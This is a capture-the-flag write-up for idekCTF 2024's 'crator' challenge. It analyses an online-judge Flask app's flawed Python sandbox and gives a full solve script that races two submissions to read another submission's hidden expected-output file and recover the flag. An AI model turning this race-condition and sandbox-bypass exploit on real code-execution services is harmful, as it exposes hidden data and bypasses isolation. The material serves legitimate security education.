# crator

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 63 solves / 257 points
- Author: @\_\_jw
- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

I made a new website to compete against my friends to see who could write faster code. Unfortunately, I don't actually know how to write that much code. Don't tell them, but ChatGPT wrote this entire website for me. Can you solve the problems for me?

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819180618.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819203438.png)

In here, we can see that there are 2 problems we can solve.

Let's click on the problem "Hello, World!":

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819203555.png)

In this problem, we'll need to print out the string "Hello, World!". Let's click on the "Submit" button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819203659.png)

Oh, we need to be authenticated first. Let's create a new account and login then!

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819203735.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819203758.png)

Then head back to the first problem:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819203822.png)

Hmm... We can only use Python programming language:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819203856.png)

Anyway, let's try to print out the string "Hello, World!":

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819204024.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819204112.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819204145.png)

Upon submission, it'll send a POST request to `/submit/helloworld` with a parameter `code`.

After that, if our output matches the expected one, the status will be "Accepted".

As you can see, this web application is a typical system for competitive programming, it's called "Online Judge".

Hmm... I wonder if the code submission is really secure and sandboxed properly... If it's not, maybe we could escape the Python sandbox.

To have a better understanding of this web application, we should read its source code.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/web/crator/crator.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/idekCTF-2024/web/crator)-[2024.08.19|20:48:53(HKT)]
└> file crator.tar.gz    
crator.tar.gz: gzip compressed data, was "crator.tar", max compression, original size modulo 2^32 81920
┌[siunam♥Mercury]-(~/ctf/idekCTF-2024/web/crator)-[2024.08.19|20:48:55(HKT)]
└> tar xvzf crator.tar.gz    
attachments/
attachments/Dockerfile
attachments/app/
attachments/app/app.py
attachments/app/db.py
attachments/app/db.sqlite
attachments/app/sandbox.py
attachments/app/templates/
attachments/app/templates/index.html
attachments/app/templates/layout.html
attachments/app/templates/login.html
attachments/app/templates/problem.html
attachments/app/templates/register.html
attachments/app/templates/submission.html
attachments/app/templates/submissions.html
attachments/app/templates/submit.html
```

After reviewing the source code, we have the following findings:
1. This web application is written in Python with web application framework "[Flask](https://flask.palletsprojects.com/en/3.0.x/)" and 
2. The DBMS (Database Management System) is SQLite and the web application uses [SQLAlchemy](https://www.sqlalchemy.org/) as the ORM (Object Relational Mapper)
3. The Python code runner is in a sandbox environment

Without further ado, let's dive in!

First, what's our objective in this challenge, where's the flag?

In `attachments/app/db.py`, we can see that the flag is updated in SQLite database table `problem_test_cases`:

```python
from sqlalchemy.orm import Session, DeclarativeBase, relationship, Mapped
import os
from sqlalchemy import create_engine, Column, Integer, String, ForeignKey, select
[...]
class ProblemTestCase(Base):
    __tablename__ = 'problem_test_cases'
    id: int = Column(Integer, primary_key=True)
    problem_id: str = Column(String, ForeignKey('problems.id'))
    input: str = Column(String)
    output: str = Column(String)
    hidden: bool = Column(Integer)
[...]
engine = create_engine('sqlite:///db.sqlite')
Base.metadata.create_all(engine)

with Session(engine) as db:
    flag = os.environ.get("FLAG")
    if flag:
        flag_case = db.scalar(select(ProblemTestCase).filter_by(problem_id="helloinput", hidden=True))
        # flag_case.input = flag
        flag_case.output = flag + "\n"
        db.commit()
```

As you can see, it selects a record from table `problem_test_cases`, where the `problem_id` is `helloinput` and **is `hidden`**. After that, it'll set the column `output`'s record to be the flag value from environment variable `FLAG`.

Moreover, in the extracted challenge file, it also contains a SQLite database file (`attachments/app/db.sqlite`), which includes all the users, problems, and problem test cases.

Let's take a look at the problem test case table's records!

```shell
┌[siunam♥Mercury]-(~/ctf/idekCTF-2024/web/crator)-[2024.08.19|21:11:14(HKT)]
└> sqlitebrowser attachments/app/db.sqlite

```

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819213534.png)

Hmm... Interesting. **In problem "Hello, Input!", there're 2 test cases, and the last one contains the flag is in the hidden test case's output**.

Now we know where the flag is, let's move on to this web application's main logic!

In `attachments/app/app.py`, we can see that there're 8 routes (Endpoints). However, one of them stands out the most, which is the problem submission route with method POST: `/submit/<problem_id>`.

Firstly, it selects a record from model (Table) `Problem`, where the `id` is parameter `problem_id`'s value:

```python
app = Flask(__name__)
[...]
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    with Session(engine) as db:
        # Select problem
        problem = db.scalar(select(Problem).filter_by(id=problem_id))
        if not problem:
            abort(404)
        if request.method == 'GET':
            return render_template('submit.html', problem=problem)
        [...]
```

After that, it selects a record from model `ProblemTestCase`, where the `problem_id` is the one in our parameter. It also checks whether our `code` POST parameter's length is too long or not:

```python
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    with Session(engine) as db:
        [...]
        # Get testcases, code, sandbox
        testcases = db.scalars(select(ProblemTestCase).filter_by(problem_id=problem_id)).all()
        code = request.form['code']
        if len(code) > 32768:
            return abort(400)
        [...]
```

Then, it'll insert a new record in model `Submission` with the value of our `problem_id`, `user_id`, `code`, and `status`. At the same time, it copies `sandbox.py` to `/tmp/sandbox.py` and write a Python script to path `/tmp/<submission_id>.py`. The content of this new Python script is it'll dynamically import (`__import__`) the sandbox script's object `Sandbox` and append our submitted `code` to the script:

```python
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    with Session(engine) as db:
        [...]
        # Create submission
        submission = Submission(problem_id=problem_id, user_id=session['user_id'], code=code, status='Pending')
        db.add(submission)
        db.commit()
        submission_id = submission.id

        # Prepare code
        shutil.copy('sandbox.py', f'/tmp/sandbox.py')
        with open(f'/tmp/{submission_id}.py', 'w') as f:
            f.write(f'__import__("sandbox").Sandbox("{submission_id}")\n' + code.replace('\r\n', '\n'))
        [...]
```

After preparing the problem, the problem test case, and our submitted sandboxed Python script, it loops through all the problem test cases and write the test case's `input` and `output` into path `/tmp/<submission_id>.in` and `/tmp/<submission_id>.expected`:

```python
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    with Session(engine) as db:
        [...]
        # Run testcases
        skip_remaining_cases = False
        for testcase in testcases:
            # Set testcase staus
            submission_case = SubmissionOutput(submission_id=submission_id, testcase_id=testcase.id, status='Pending')
            db.add(submission_case)
            if skip_remaining_cases:
                submission_case.status = 'Skipped'
                db.commit()
                continue

            if not testcase.hidden:
                submission_case.expected_output = testcase.output
            # Set up input and output files
            with open(f'/tmp/{submission_id}.in', 'w') as f:
                f.write(testcase.input.replace('\r\n', '\n'))
            with open(f'/tmp/{submission_id}.expected', 'w') as f:
                f.write(testcase.output.replace('\r\n', '\n'))
            [...]
```

Remember, in problem `Hello, Input!`, there's a test case that contains the flag in the `output`. However, since that test case is `hidden`, the submission case's `expected_output` is empty.

During the problem test cases loop, it'll call module `subprocess`'s `run` function, which execute a shell command that runs our submitted sandbox Python code with **1 second timeout**. After running our submitted code, it captures the Python script's stdout (Standard Output) and compares the expected test case's output using shell command `diff`:

```python
import subprocess
[...]
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    with Session(engine) as db:
        [...]
        for testcase in testcases:
            # Run code
            try:
                proc = subprocess.run(f'sudo -u nobody -g nogroup python3 /tmp/{submission_id}.py < /tmp/{submission_id}.in > /tmp/{submission_id}.out', shell=True, timeout=1)
                if proc.returncode != 0:
                    submission.status = 'Runtime Error'
                    skip_remaining_cases = True
                    submission_case.status = 'Runtime Error'
                else:
                    diff = subprocess.run(f'diff /tmp/{submission_id}.out /tmp/{submission_id}.expected', shell=True, capture_output=True)
                    if diff.stdout:
                        submission.status = 'Wrong Answer'
                        skip_remaining_cases = True
                        submission_case.status = 'Wrong Answer'
                    else:
                        submission_case.status = 'Accepted'
            except subprocess.TimeoutExpired:
                submission.status = 'Time Limit Exceeded'
                skip_remaining_cases = True
                submission_case.status = 'Time Limit Exceeded'
        [...]
```

As you can see, ***if our output is incorrect, it'll skip the remaining test cases***.

After comparing our submitted code's output and the test case's output, it'll insert a new submission case record into model `Submission` with our submitted code's output and remove all the test cases' input and output and our submitted code's file:

```python
def __cleanup_test_case(submission_id):
    os.remove(f'/tmp/{submission_id}.in')
    os.remove(f'/tmp/{submission_id}.out')
    os.remove(f'/tmp/{submission_id}.expected')
[...]
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    with Session(engine) as db:
        [...]
        for testcase in testcases:
            [...]
            # Cleanup
            with open(f'/tmp/{submission_id}.out', 'r') as f:
                submission_case.actual_output = f.read(1024)
            db.commit()
            __cleanup_test_case(submission_id)
    # Set overall status
    if submission.status == 'Pending':
        submission.status = 'Accepted'
        db.commit()
    os.remove(f'/tmp/{submission_id}.py')
    return redirect(f'/submission/{submission_id}')
```

Based on the above code, we can think about how to get the last test case's output:
1. [ORM leak](https://www.elttam.com/blog/plormbing-your-django-orm/)? But it seems like we can't control the `select` filter
2. Using Python's `open` to read the SQLite database file? Nope, the `Dockerfile` set the database file permission to be read by the owner only (`chmod 600 db.sqlite`)
3. Using Python's `open` to read the environment variable `FLAG`? Nope, the Python code runner's user is `nobody`, we don't have the permission to read `/proc/1/environ`
4. Python sandbox escape? Maybe?
5. Race condition to read the output before deleting it? Maybe?

If we pay attention, we can actually notice a potential **race condition in writing the test cases' output to path `/tmp/<submission_id>.expected`**.

Let's assume we send 2 problem submission requests at the same time and the first `submission_id` is `1`:
1. First request: Python code is `print(input())`, which writes 2 test cases' output to path `/tmp/1.expected` as its the correct answer
2. Second request: Python code is to read the first request's last test case's output at path `/tmp/1.expected`

Because of this, we can **abuse the race window to read the first request's last test case's output in the second request**.

But wait, isn't the race window is a little bit too small? Don't worry, we can **increase the race window** by running an **infinite loop in the first request after printing the correct answer**. Since the `timeout` is 1 second, we can have 1 second race window to read the last test case's output.

To read the output, we can use Python's built-in function `open` to read the first request's last test case's output.

But wait, **does the sandbox Python script's object `Sandbox` blocks built-in function `open`?**

Let's take a closer look into `attachments/app/sandbox.py`:

```python
def _safe_open(open, submission_id):
    def safe_open(file, mode="r"):
        if mode != "r":
            raise RuntimeError("Nein")
        file = str(file)
        if file.endswith(submission_id + ".expected"):
            raise RuntimeError("Nein")
        return open(file, "r")

    return safe_open
[...]
class Sandbox(object):
    def __init__(self, submission_id):
        import sys
        [...]
        original_builtins = sys.modules["__main__"].__dict__["__builtins__"].__dict__
        original_builtins["open"] = _safe_open(open, submission_id)
        [...]
```

As you can see, the built-in function `open` is overwritten by function `_safe_open`. In that function, the `mode` must be `r` (read) and **the filename must not ends with `<submission_id>.expected`**.

However, this implementation is flawed, as **it only checks the current `submission_id`** instead of all filenames that ends with `.expected`.

Therefore, we can **use this new `open` function to read previous `/tmp/<submission_id>.expected` files**.

## Exploitation

Armed with the above information, we can write a solve script that contains the following steps:
1. Register a new account
2. Login to that new account
3. Submit 2 problem "Hello, Input!" code at the same time:
    1. Submit a correct answer, which temporarily writes the last test case's output to `/tmp/1.expected`
    2. Submit an incorrect answer, which reads the first request's last test case's output at `/tmp/1.expected`

<details>
    <summary>solve.py</summary>

```python
import asyncio
import aiohttp
from bs4 import BeautifulSoup

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.REGISTER_ACCOUNT_URL = f'{self.baseUrl}/register'
        self.USERNAME, self.PASSWORD = 'user', 'password'
        self.LOGIN_URL = f'{self.baseUrl}/login'
        self.SUBMIT_HELLO_INPUT_PROBLEM_URL = f'{self.baseUrl}/submit/helloinput'
        
    async def registerAndLogin(self, session):
        await session.post(self.REGISTER_ACCOUNT_URL, data={ 'username': self.USERNAME, 'password': self.PASSWORD })
        await session.post(self.LOGIN_URL, data={ 'username': self.USERNAME, 'password': self.PASSWORD })
    
    async def sendSubmitRequest(self, session, payload, delay=False):
        # wait for the last test case's output is being written to /tmp/<submission_id>.expected
        if delay == True:
            await asyncio.sleep(0.2)

        async with session.post(self.SUBMIT_HELLO_INPUT_PROBLEM_URL, data={ 'code': payload }, allow_redirects=True) as response:
            responseText = await response.text()
            soup = BeautifulSoup(responseText, 'html.parser')
            result = soup.findAll('pre')[2].text.strip()
            if len(result) == 0:
                return 'No result'

            return result

    async def getAndExecuteSubmitRequestTask(self, session, submissionId):
        correctAnswer = '''\
answer = input()
print(answer)

# we want to print out the correct answer first, 
# then increase the race window
if answer != 'Welcome to Crator':
    while True:
        pass
'''
        payload = f'''\
with open('/tmp/{submissionId}.expected', 'r') as file:
    print(file.read())
'''

        tasks = list()
        tasks.append(self.sendSubmitRequest(session, correctAnswer))
        tasks.append(self.sendSubmitRequest(session, payload, delay=True))
        return await asyncio.gather(*tasks)

    async def solve(self, submissionId='1'):
        async with aiohttp.ClientSession() as session:
            await self.registerAndLogin(session)

            results = await self.getAndExecuteSubmitRequestTask(session, submissionId)
            for i, result in enumerate(results):
                if i == 0:
                    print(f'[+] First request output: {result}')
                elif i == 1:
                    print(f'[+] Second request output: {result}')

if __name__ == '__main__':
    baseUrl = 'https://crator-5ec1b9acda7c9be6.instancer.idek.team/'
    # baseUrl = 'http://localhost:1337'
    solver = Solver(baseUrl)

    # submissionId = '3'
    # asyncio.run(solver.solve(submissionId))
    asyncio.run(solver.solve())
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/idekCTF-2024/web/crator)-[2024.08.20|9:35:47(HKT)]
└> python3 solve.py
[+] First request output: Welcome to Crator
[+] Second request output: idek{1m4g1n3_n0t_h4v1ng_pr0p3r_s4ndb0x1ng}
```

- **Flag: `idek{1m4g1n3_n0t_h4v1ng_pr0p3r_s4ndb0x1ng}`**

## Conclusion

What we've learned:

1. Race condition to read removed files